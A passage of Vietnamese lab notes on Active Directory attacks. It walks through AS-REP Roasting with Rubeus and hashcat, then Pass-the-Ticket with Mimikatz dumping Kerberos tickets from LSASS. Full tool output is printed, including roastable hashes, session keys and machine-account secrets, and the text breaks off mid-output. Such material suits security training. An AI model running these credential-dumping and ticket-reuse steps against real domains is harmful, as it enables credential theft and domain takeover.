Ngoài Rubeus còn có các công cụ khác hỗ trợ AS-REP Roasting như kekeo và GetNPUsers.py của Impacket. Tuy nhiên Rubeus dễ sử dụng hơn vì nó tự động tìm các tài khoản có thể AS-REP Roast, trong khi với GetNPUsers.py bạn phải enumerate user trước và tự xác định user nào có khả năng bị AS-REP Roast.



Nếu user bị cấu hình:

> `Do not require Kerberos preauthentication`

thì xảy ra điều này:

1. Client gửi AS-REQ bình thường (không cần chứng minh gì)
2. KDC vẫn trả về AS-REP
3. AS-REP chứa dữ liệu được mã hóa bằng **hash mật khẩu của user**
4. Hacker có thể lấy cái này và **crack offline**



## AS-REP Roasting Overview -&#x20;



ưu tiên dùng Impacket




Trong quá trình pre-authentication, hash của user được dùng để mã hóa một timestamp. Domain Controller sẽ cố gắng giải mã timestamp đó để xác minh rằng client đang sử dụng đúng hash và không phải đang phát lại một yêu cầu cũ.

Sau khi xác thực timestamp thành công, KDC sẽ cấp một TGT cho user.

Nếu pre-authentication bị tắt, bạn có thể yêu cầu dữ liệu xác thực của bất kỳ user nào và KDC sẽ trả về một TGT đã được mã hóa. Hash tương ứng có thể bị crack offline vì KDC đã bỏ qua bước xác minh xem người yêu cầu có thực sự là user đó hay không. Điều này khiến attacker có thể lấy được hash mà không cần biết mật khẩu của tài khoản mục tiêu.

<figure><img src="../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

### Dumping KRBASREP5 Hashes w/ Rubeus -



`Rubeus.exe asreproast` - lệnh này sẽ thực hiện AS-REP roasting, tìm các user dễ bị khai thác và sau đó dump ra các hash của những user đó.

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::b11e:1aa2:f103:9fdd%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:B4D898461EB87F477B8944A62C3D7562$EBF6F9A9763C
      4CBC403E613565625B6297242DDABD84A42A86572D22140CCA2E0724FA43ED4903BCCD5E8A4CB9A5
      A1489CDE5F6F70729AB14B2A932A2313079A3D4C6AC8F38CFDA5056625F4CB99B1DCE313B7C5BE28
      B95ACF05A8928FDF4D14ABC67E758BDACFE504CE58C9DCA70510716F5A69AC32751B27B247656766
      745C6C04FC1ABD7EB4B60604A9CB9DC4CFE2EEE195DC09EE2832B4B3A4ED85AEB2EBA8EF02BB4AA8
      369FCD55ABD1FDCFE9F7137B5A54F0F6FE91E79D671344D0CBD503A39A445AFE29CBCB1515E52908
      107B000D9A86052D324C70193E0A6F7EFC1D4CC169D0AF3AA0035841435DD40EEFAD7E2149B5

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::b11e:1aa2:f103:9fdd%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:C1375FDC1BBEA61AC47A090F385EFCC9$9A1CE5E9F5788
      7DF4B76DE82F0C5AC83F8C8F0C3EC4798D10A9F251DE2E716F6D1542F690D88AA11E1A3013DECA7A
      2775C803231BB34004DFFA6517382D2A68915899BD81970D405490C261752108A1F1098A750B7098
      D02DB7EA1B0D07B9C07E176B49A6872A00BE6694DF90350BAB1A9B658E525D7F0DA96DF8639939C7
      6B1E284103B9A2752124E43B799212E8E1DB74622EDABF064E1D76C6032CFCFB0AF7390D3B63980E
      77C650BF091215B58C7CE4DCF6071A788D1273B88E60EB5169A50418F39D8B149AA3F8F7D4D240A6
      4FA2176635F7B6ECFB0422F9DC406BF0EC4D0DD0B81E8B73E1D67CD40C83385E350B3759D00


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>

```



### Crack those Hashes w/ hashcat - &#xD; &#xD;



* Chèn 23$ vào sau $krb5asrep$ để dòng đầu tiên có dạng:\
  $krb5asrep$23$User.....
* Dùng lại wordlist đã tải ở task 4
* Chạy hashcat để crack hash:

```bash
hashcat -m 18200 hash.txt Pass.txt
```

Rubeus AS-REP Roasting sử dụng hashcat mode 18200

```bash
(base) ┌──(kali㉿kali)-[~/ket]
└─$ hashcat -m 18200 hash1.txt Pass.txt 
```

<figure><img src="../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

### AS-REP Roasting Mitigations -&#x20;

* Áp dụng chính sách mật khẩu mạnh. Khi mật khẩu đủ mạnh, việc crack các hash sẽ mất nhiều thời gian hơn, làm cho AS-REP Roasting kém hiệu quả hơn.
* Không tắt Kerberos Pre-Authentication trừ khi thực sự cần thiết. Gần như không có biện pháp nào khác để giảm thiểu hoàn toàn cuộc tấn công này ngoài việc giữ Pre-Authentication luôn được bật.



<figure><img src="../.gitbook/assets/image (977).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

### Pass the Ticket w/ mimikatz&#xD; &#xD;

Mimikatz là một công cụ hậu khai thác rất phổ biến và mạnh mẽ, thường được sử dụng để dump credential của người dùng trong môi trường Active Directory. Tuy nhiên trong phần này, chúng ta sẽ dùng Mimikatz để dump một TGT từ bộ nhớ của tiến trình LSASS.

Bạn vẫn có thể thực hiện cuộc tấn công này trên máy được cung cấp trong bài lab. Tuy nhiên do cách Domain Controller được cấu hình, bạn sẽ thực chất đang leo quyền từ một Domain Admin sang một Domain Admin khác, nên giá trị thực tế của việc leo quyền trong lab này không nhiều. Mục tiêu chính là để hiểu cơ chế hoạt động của Pass-the-Ticket.



### Pass the Ticket Overview -&#x20;

<figure><img src="../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

Pass-the-Ticket hoạt động bằng cách dump TGT từ bộ nhớ của tiến trình LSASS trên máy.

LSASS là viết tắt của Local Security Authority Subsystem Service, một tiến trình của Windows chịu trách nhiệm lưu trữ và quản lý thông tin xác thực. Trong môi trường Active Directory, LSASS có thể lưu:

* Kerberos tickets
* NTLM credentials
* Các loại credential khác

LSASS đóng vai trò như một "người gác cổng", quyết định chấp nhận hay từ chối các thông tin xác thực được cung cấp.

Tương tự như việc dump password hash, bạn cũng có thể dump các Kerberos ticket từ bộ nhớ LSASS. Khi dùng Mimikatz để dump ticket, bạn sẽ thu được các file .kirbi.

Nếu trong LSASS đang tồn tại ticket của một Domain Admin, file .kirbi đó có thể được sử dụng để giành quyền tương đương Domain Admin mà không cần biết mật khẩu của tài khoản đó.

Kỹ thuật này rất hữu ích cho:

* Privilege Escalation
* Lateral Movement

đặc biệt khi trong hệ thống tồn tại các service account hoặc tài khoản đặc quyền đã đăng nhập và để lại ticket trong bộ nhớ.

Về bản chất, cuộc tấn công cho phép bạn leo lên Domain Admin bằng cách:

1. Dump ticket của Domain Admin từ LSASS.
2. Import hoặc impersonate ticket đó bằng kỹ thuật Pass-the-Ticket của Mimikatz.
3. Thực hiện các hành động với quyền của Domain Admin.

Điểm quan trọng là Pass-the-Ticket không tạo ticket mới và cũng không sửa đổi ticket hiện có.

Nó chỉ đơn giản là tái sử dụng một ticket hợp lệ đã tồn tại trong domain và giả mạo danh tính của người sở hữu ticket đó.

Có thể hình dung như sau:

* Pass-the-Hash: lấy hash của người khác và xác thực bằng hash đó.
* Pass-the-Ticket: lấy Kerberos ticket của người khác và sử dụng ticket đó để xác thực.



### Prepare Mimikatz & Dump Tickets - &#xD; &#xD;

Bạn cần chạy Command Prompt với quyền Administrator

Nếu Command Prompt không được mở với quyền nâng cao, Mimikatz sẽ không hoạt động đúng.

<figure><img src="../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

Chạy Mimikatz:

```
mimikatz.exe
```

Kích hoạt quyền debug:

```
privilege::debug
```

Nếu thành công, bạn sẽ thấy kết quả tương tự:

```
Privilege '20' OK
```

`sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently&#x20;

Ở bước này, ta cũng có thể sử dụng các ticket được mã hóa Base64 mà ta đã thu thập trước đó bằng Rubeus.

Nói cách khác, thay vì dump ticket trực tiếp từ LSASS bằng Mimikatz, ta có thể dùng luôn các Kerberos ticket đã được Rubeus export hoặc harvest từ trước để thực hiện các bước tiếp theo của Pass-the-Ticket.

Khi lựa chọn ticket để impersonate, bạn nên ưu tiên tìm ticket của tài khoản Administrator có liên quan tới dịch vụ krbtgt, giống như ticket được đánh dấu màu đỏ trong hình minh họa phía trên.

<figure><img src="../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

```bash
mimikatz # sekurlsa::tickets /export 

Authentication Id : 0 ; 2076133 (00000000:001fade5)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 6/25/2026 3:25:53 AM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/25/2026 3:25:53 AM ; 6/25/2026 1:25:53 PM ; 7/2/2026 3:25:53 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             52f94c975fe2d8aab2fdc370770ccfff8d1b6e4d0e52cc2da98f91bd2b66a4a9
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1fade5]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 2070913 (00000000:001f9981)
Session           : Service from 0
User Name         : sshd_2124
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 6/25/2026 3:25:44 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-2124

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : ef c7 d0 93 fc f5 a9 90 1c b0 01 11 9e ec 5f f9 e5 a5 6f 91 e2 81 17 1d ef 4a 86 91 dc 56 cc 13 0c 19 2f 66 73 c1 27 71 8c 86 de 30 06 15 22 64 be 2d d
3 0e 72 c7 8a 5c 40 38 43 66 be 05 84 1c f9 36 17 5a 5d 16 91 02 49 4d 40 3c 4f 97 17 b7 f6 21 70 b1 8c 71 3e 04 2f 2b ce fe 43 18 8d d1 05 eb 12 47 51 c1 0a ee 55 b7 9c 7d 
32 f2 6d 6e 7c 42 fc 20 5d fc 6b 25 37 21 16 6e 22 f6 0e 1b b9 4c fa 68 05 28 04 25 43 e5 a9 5e 3b e9 f8 85 bb ba 70 2b 91 f2 ad 10 58 d2 0e a0 6a f8 33 55 80 a1 9f 49 c7 7f
 28 ec 46 03 aa 3e 92 66 6a 50 a7 76 d3 a9 e5 30 c7 c0 5b 57 25 c9 8d ba 7b 92 d6 9b ca f1 87 79 5a d8 44 14 ea 30 83 3e c7 f7 40 47 dd ed ff 55 d6 5b 2d 3a 6f 77 0d 42 1d 9
e b0 24 d9 f6 3a 06 75 48 42 ae 01 0c ae 18 71 91

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1660134 (00000000:001954e6)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 3:12:19 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/25/2026 3:12:19 AM ; 6/25/2026 12:57:48 PM ;
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             57e5ae6118dacd4db0f402e66f2b56605549aefb8832546078b3111a6d7737ef
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;1954e6]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 413309 (00000000:00064e7d)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 3:02:31 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0076fa32c13f08d1bdeded5a810bf509fcdde75f529ad19400cc8ca68cd5053d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;64e7d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 413100 (00000000:00064dac)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 3:02:31 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0076fa32c13f08d1bdeded5a810bf509fcdde75f529ad19400cc8ca68cd5053d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;64dac]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60834 (00000000:0000eda2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:11 AM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : ef c7 d0 93 fc f5 a9 90 1c b0 01 11 9e ec 5f f9 e5 a5 6f 91 e2 81 17 1d ef 4a 86 91 dc 56 cc 13 0c 19 2f 66 73 c1 27 71 8c 86 de 30 06 15 22 64 be 2d d
3 0e 72 c7 8a 5c 40 38 43 66 be 05 84 1c f9 36 17 5a 5d 16 91 02 49 4d 40 3c 4f 97 17 b7 f6 21 70 b1 8c 71 3e 04 2f 2b ce fe 43 18 8d d1 05 eb 12 47 51 c1 0a ee 55 b7 9c 7d 
32 f2 6d 6e 7c 42 fc 20 5d fc 6b 25 37 21 16 6e 22 f6 0e 1b b9 4c fa 68 05 28 04 25 43 e5 a9 5e 3b e9 f8 85 bb ba 70 2b 91 f2 ad 10 58 d2 0e a0 6a f8 33 55 80 a1 9f 49 c7 7f
 28 ec 46 03 aa 3e 92 66 6a 50 a7 76 d3 a9 e5 30 c7 c0 5b 57 25 c9 8d ba 7b 92 d6 9b ca f1 87 79 5a d8 44 14 ea 30 83 3e c7 f7 40 47 dd ed ff 55 d6 5b 2d 3a 6f 77 0d 42 1d 9
e b0 24 d9 f6 3a 06 75 48 42 ae 01 0c ae 18 71 91

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:09 AM
SID               : S-1-5-20

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 6/25/2026 3:27:15 AM ; 6/25/2026 1:27:15 PM ; 7/2/2026 3:27:15 AM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             08023cfe990514c1c81e6c01d8da711738c7b5fdc4508396e0816eebd5e68945
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/25/2026 3:27:15 AM ; 6/25/2026 1:27:15 PM ; 7/2/2026 3:27:15 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9220d331ead8a7541aefc74882d8e94e5819729387241dde4fc0eb753ed4cffe
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 33439 (00000000:0000829f)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:08 AM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f
1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 
4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68
 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5
d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 33343 (00000000:0000823f)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:08 AM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : ef c7 d0 93 fc f5 a9 90 1c b0 01 11 9e ec 5f f9 e5 a5 6f 91 e2 81 17 1d ef 4a 86 91 dc 56 cc 13 0c 19 2f 66 73 c1 27 71 8c 86 de 30 06 15 22 64 be 2d d
3 0e 72 c7 8a 5c 40 38 43 66 be 05 84 1c f9 36 17 5a 5d 16 91 02 49 4d 40 3c 4f 97 17 b7 f6 21 70 b1 8c 71 3e 04 2f 2b ce fe 43 18 8d d1 05 eb 12 47 51 c1 0a ee 55 b7 9c 7d 
32 f2 6d 6e 7c 42 fc 20 5d fc 6b 25 37 21 16 6e 22 f6 0e 1b b9 4c fa 68 05 28 04 25 43 e5 a9 5e 3b e9 f8 85 bb ba 70 2b 91 f2 ad 10 58 d2 0e a0 6a f8 33 55 80 a1 9f 49 c7 7f
 28 ec 46 03 aa 3e 92 66 6a 50 a7 76 d3 a9 e5 30 c7 c0 5b 57 25 c9 8d ba 7b 92 d6 9b ca f1 87 79 5a d8 44 14 ea 30 83 3e c7 f7 40 47 dd ed ff 55 d6 5b 2d 3a 6f 77 0d 42 1d 9
e b0 24 d9 f6 3a 06 75 48 42 ae 01 0c ae 18 71 91

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 33276 (00000000:000081fc)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:08 AM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : ef c7 d0 93 fc f5 a9 90 1c b0 01 11 9e ec 5f f9 e5 a5 6f 91 e2 81 17 1d ef 4a 86 91 dc 56 cc 13 0c 19 2f 66 73 c1 27 71 8c 86 de 30 06 15 22 64 be 2d d
3 0e 72 c7 8a 5c 40 38 43 66 be 05 84 1c f9 36 17 5a 5d 16 91 02 49 4d 40 3c 4f 97 17 b7 f6 21 70 b1 8c 71 3e 04 2f 2b ce fe 43 18 8d d1 05 eb 12 47 51 c1 0a ee 55 b7 9c 7d 
32 f2 6d 6e 7c 42 fc 20 5d fc 6b 25 37 21 16 6e 22 f6 0e 1b b9 4c fa 68 05 28 04 25 43 e5 a9 5e 3b e9 f8 85 bb ba 70 2b 91 f2 ad 10 58 d2 0e a0 6a f8 33 55 80 a1 9f 49 c7 7f
 28 ec 46 03 aa 3e 92 66 6a 50 a7 76 d3 a9 e5 30 c7 c0 5b 57 25 c9 8d ba 7b 92 d6 9b ca f1 87 79 5a d8 44 14 ea 30 83 3e c7 f7 40 47 dd ed ff 55 d6 5b 2d 3a 6f 77 0d 42 1d 9
e b0 24 d9 f6 3a 06 75 48 42 ae 01 0c ae 18 71 91

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 2671449 (00000000:0028c359)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 3:28:37 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9a65d95f3c53ded303b29e9680b1bfd9473783ce58c3f32713460bcdff9eac82
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;28c359]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 413252 (00000000:00064e44)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 3:02:31 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:56 AM ; 6/25/2026 12:57:48 PM ;
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             8d64c0200906ad7d36918d2f90a1c1384228511127cc787c954286d79168cd6a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;64e44]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 413192 (00000000:00064e08)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 3:02:31 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0076fa32c13f08d1bdeded5a810bf509fcdde75f529ad19400cc8ca68cd5053d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;64e08]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 191429 (00000000:0002ebc5)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:48 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9a65d95f3c53ded303b29e9680b1bfd9473783ce58c3f32713460bcdff9eac82
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;2ebc5]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 190708 (00000000:0002e8f4)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:48 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ;
